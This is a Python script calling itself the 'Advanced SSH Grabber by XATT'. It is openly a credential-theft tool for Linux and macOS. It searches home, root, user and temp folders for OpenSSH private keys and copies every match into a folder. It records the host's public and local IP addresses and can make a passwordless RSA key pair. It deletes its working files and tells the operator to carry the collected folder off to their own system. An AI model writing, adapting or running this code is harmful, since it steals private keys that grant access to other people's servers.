from sys import platform
import os

x = input("Want to start the script? Y / N\n")

def filecheck():
    os.system('ls sshfiles > 1.log')
    file_path= '1.log'
    if os.stat(file_path).st_size == 0:
        print("empty")
        return(0)
    else:
        print("full")
        return(1)

if platform == "linux" and x.lower() == "y":
    print("You are using the Advanced SSH Grabber by XATT.")
    print(f"OS detected: {platform}.")
    os.system('echo "" > SSHlocations.txt')
    os.system('find /home /root /tmp -type f -exec grep -l "BEGIN OPENSSH" {} > SSHlocations.txt \;')
    os.system('mkdir sshfiles')
    with open("SSHlocations.txt" , "r") as f:
        lines = f.readlines()
        for line in lines:
            line = line.strip()
            print(line)
            os.system(f'cp -r {line} sshfiles')
    if filecheck() == 0:
        print("No files detected\n")
        q = input("Do you want to run SSH-gen? Y / N\n")
        if q.lower() == "y":
            os.system("""HOSTNAME=`hostname` ssh-keygen -t rsa -C "$HOSTNAME" -f "sshfiles/id_rsa" -P "" && cat ~/sshfiles/id_rsa.pub""")
            print("Done.\n No password required.")
        else:
            exit()
    os.system('curl ifconfig.me > sshfiles/PublicIP.txt; ifconfig > sshfiles/LocalIP.txt')
    print("Cleaing up.")
    os.system('rm -rf SSHlocations.txt; rm -rf 1.log')
    print("Done, transfer the 'sshfiles' folder to your system.")

elif platform == "darwin" and x.lower() == "y":
    print("You are using the Advanced SSH Grabber by XATT.")
    print(f"OS detected: {platform}.")
    os.system('echo "" > SSHlocations.txt')
    os.system('find /home /Users /tmp -type f -exec grep -l "BEGIN OPENSSH" {} > SSHlocations.txt \;')
    os.system('mkdir sshfiles')
    with open("SSHlocations.txt" , "r") as f:
        lines = f.readlines()
        for line in lines:
            line = line.strip()
            print(line)
            os.system(f'cp -r {line} sshfiles')
    if filecheck() == 0:
        print("No files detected\n")
        q = input("Do you want to run SSH-gen? Y / N\n")
        if q.lower() == "y":
            os.system("""HOSTNAME=`hostname` ssh-keygen -t rsa -C "$HOSTNAME" -f "sshfiles/id_rsa" -P "" && cat ~/sshfiles/id_rsa.pub""")
            print("Done.\n No password required.")
        else:
            exit()
    os.system('curl ifconfig.me > sshfiles/PublicIP.txt; ifconfig > sshfiles/LocalIP.txt')
    print("Cleaing up.")
    os.system('rm -rf SSHlocations.txt; rm -rf 1.log')
    print("Done, transfer the 'sshfiles' folder to your system.")
elif platform == "win32" and x.lower() == "y":
    print("You are using the Advanced SSH Grabber by XATT.")
    print(f"OS detected: {platform}.")
    print("This platform is not supported yet.")
